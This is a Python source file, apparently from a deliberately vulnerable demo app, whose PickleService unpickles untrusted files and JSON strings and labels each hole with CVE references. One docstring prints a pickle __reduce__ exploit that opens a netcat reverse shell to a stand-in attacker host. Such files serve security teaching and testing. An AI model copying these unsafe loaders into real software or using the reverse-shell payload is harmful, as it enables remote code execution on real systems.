"""Pickle service with deserialization vulnerabilities

VULNERABILITIES:
- Unsafe pickle deserialization
- Unsafe jsonpickle usage
- No input validation
"""

import pickle
import os


class PickleService:
    """Pickle serialization - DELIBERATELY INSECURE"""
    
    @staticmethod
    def save_model(model_data, filepath):
        """Save model using pickle
        CVE Reference: CVE-2022-34668 (NVFLARE pickle vuln)
        """
        # VULN: Pickle serialization without safety checks
        with open(filepath, 'wb') as f:
            pickle.dump(model_data, f)
        return filepath
    
    @staticmethod
    def load_model(filepath):
        """VULN: Unsafe pickle deserialization
        CVE Reference: CVE-2022-34668 (NVFLARE), CVE-2021-24040 (ParlAI)
        
        Exploit: Upload malicious .pkl file with __reduce__ method:
        ```python
        import pickle, os
        class Exploit:
            def __reduce__(self):
                return (os.system, ('nc attacker.com 4444 -e /bin/sh',))
        pickle.dump(Exploit(), open('evil.pkl', 'wb'))
        ```
        """
        # VULN: Unsafe deserialization - RCE
        with open(filepath, 'rb') as f:
            return pickle.load(f)  # VULN: Arbitrary code execution
    
    @staticmethod
    def load_jsonpickle(json_str):
        """VULN: jsonpickle deserialization
        CVE Reference: CVE assigned (jsonpickle 2.0.0 RCE)
        
        Exploit: Send JSON with py/object containing malicious class
        """
        try:
            import jsonpickle
            # VULN: jsonpickle.decode() allows arbitrary object instantiation
            return jsonpickle.decode(json_str)  # VULN
        except ImportError:
            # Fallback to regular pickle if jsonpickle not available
            import base64
            return pickle.loads(base64.b64decode(json_str))
